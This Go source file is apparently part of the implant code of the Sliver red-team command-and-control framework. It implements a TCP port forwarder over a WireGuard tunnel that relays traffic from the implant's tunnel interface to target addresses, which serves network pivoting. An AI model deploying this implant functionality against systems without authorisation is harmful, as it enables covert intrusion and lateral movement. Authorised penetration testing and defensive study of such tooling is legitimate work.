package forwarder

// {{if .Config.WGc2Enabled}}
import (
	"fmt"
	"io"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
	"net"
	"sync"

	"github.com/bishopfox/sliver/implant/sliver/netstack"
)

var tcpForwarderID = 0

type WGTCPForwarder struct {
	ID            int
	tunIP         string
	tunPort       int
	targetAddress string
	tnet          *netstack.Net
	done          chan bool
	wg            sync.WaitGroup
	listener      net.Listener
}

func NewWGTCPForwarder(targetAddress string, tunIP string, tunPort int, tnet *netstack.Net) *WGTCPForwarder {
	tf := &WGTCPForwarder{
		tunIP:         tunIP,
		tunPort:       tunPort,
		targetAddress: targetAddress,
		tnet:          tnet,
		done:          make(chan bool),
		ID:            tcpForwarderID,
	}
	nextTCPForwarderID()
	tcpForwarders[tf.ID] = tf
	return tf
}

func (f *WGTCPForwarder) LocalAddr() string {
	return fmt.Sprintf("%s:%d", f.tunIP, f.tunPort)
}

func (f *WGTCPForwarder) RemoteAddr() string {
	return f.targetAddress
}

func (f *WGTCPForwarder) Start() error {
	// Start wg net listener
	var err error
	f.listener, err = f.tnet.ListenTCP(&net.TCPAddr{IP: net.ParseIP(f.tunIP), Port: f.tunPort})
	if err != nil {
		return err
	}
	for {
		select {
		case <-f.done:
			// {{if .Config.Debug}}
			log.Println("channel closed")
			// {{end}}
			return nil
		default:
			tconn, err := f.listener.Accept()
			if err != nil {
				return err
			}
			f.wg.Add(1)
			conn, err := net.Dial("tcp", f.targetAddress)
			if err != nil {
				return err
			}
			go forward(tconn, conn)
			go forward(conn, tconn)
			f.wg.Done()
		}
	}
}

func (f *WGTCPForwarder) Stop() {
	// {{if .Config.Debug}}
	log.Printf("Stop called, closing channel\n")
	// {{end}}
	close(f.done)
	f.listener.Close()
	f.wg.Wait()
}

func forward(src, dst net.Conn) {
	defer src.Close()
	defer dst.Close()
	io.Copy(dst, src)
}

func nextTCPForwarderID() {
	tcpForwarderID++
}

// {{end}}
